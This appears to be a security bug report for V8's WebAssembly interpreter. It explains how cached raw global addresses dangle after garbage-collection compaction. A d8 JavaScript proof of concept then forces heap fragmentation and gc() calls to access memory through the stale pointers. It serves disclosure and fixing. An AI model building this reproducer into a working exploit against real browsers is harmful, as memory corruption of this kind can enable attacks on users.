# Problem Description
## Root Cause

### The Stale Pointer Chain

1. **Cache initialization** (`src/wasm/interpreter/wasm-interpreter-runtime.cc:353-363`):
   `InitGlobalAddressCache()` extracts raw `Address` values from the heap-allocated `ByteArray` backing `WasmTrustedInstanceData::untagged_globals_buffer()` and stores them in:
   ```cpp
   std::vector<Address> global_addresses_;  // wasm-interpreter-runtime.h:352
   ```

2. **Access path** (`src/wasm/interpreter/wasm-interpreter-runtime-inl.h:52-55`):
   Every `global.get` / `global.set` instruction calls:
   ```cpp
   inline Address WasmInterpreterRuntime::GetGlobalAddress(uint32_t index) {
     DCHECK_LT(index, module_->globals.size());
     return global_addresses_[index];  // Returns cached raw pointer — never re-fetched
   }
   ```

3. **GC compaction moves the ByteArray**:
   The `untagged_globals_buffer` is allocated with `AllocationType::kOld` in regular old-generation heap space (`src/wasm/module-instantiate.cc:1196`). The compacting GC can relocate it. V8's GC updates all **tagged** references (including the one in `WasmTrustedInstanceData`), but has no knowledge of the raw `Address` values in the C++ `std::vector`.

4. **Crash**: Post-compaction, `GetGlobalAddress()` returns a dangling pointer into the ByteArray's **former** location. The freed page is returned to the OS or reprotected, so dereferencing it triggers `SEGV_ACCERR`.

(function() {
  for (let trial = 0; trial < 20; trial++) {
	  d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");
    const builder = new WasmModuleBuilder();

    // Large number of globals to maximize ByteArray size
    const N = 500;
    const globals = [];
    for (let i = 0; i < N; i++) {
      globals.push(builder.addGlobal(kWasmF64, true, false,
        wasmF64Const(i * 1.5)));
    }

    // Read/write first and last globals
    builder.addFunction("get0", kSig_d_v).exportFunc().addBody([
      kExprGlobalGet, ...wasmUnsignedLeb(globals[0].index)
    ]);
    builder.addFunction("getLast", kSig_d_v).exportFunc().addBody([
      kExprGlobalGet, ...wasmUnsignedLeb(globals[N-1].index)
    ]);
    builder.addFunction("set0", makeSig([kWasmF64], [])).exportFunc().addBody([
      kExprLocalGet, 0,
      kExprGlobalSet, ...wasmUnsignedLeb(globals[0].index)
    ]);
    builder.addFunction("setLast", makeSig([kWasmF64], [])).exportFunc().addBody([
      kExprLocalGet, 0,
      kExprGlobalSet, ...wasmUnsignedLeb(globals[N-1].index)
    ]);

    const instance = builder.instantiate();

    // Massive GC pressure
    for (let round = 0; round < 100; round++) {
      // Fragment heap
      let junk = [];
      for (let j = 0; j < 200; j++) {
        junk.push(new ArrayBuffer(1024));
      }
      // Drop half to create holes
      for (let j = 0; j < junk.length; j += 2) junk[j] = null;
      gc();
      junk = null;
      gc();

      // Access globals through stale addresses
      instance.exports.set0(42.5);
      instance.exports.setLast(-1.5);
      let v0 = instance.exports.get0();
      let vL = instance.exports.getLast();

      if (round === 0 && v0 !== 42.5) {
        print("Trial " + trial + " Round " + round + ": CORRUPTION (get0=" + v0 + ", getLast=" + vL + ")");
      }
    }
  }
  print("All trials complete");
})();
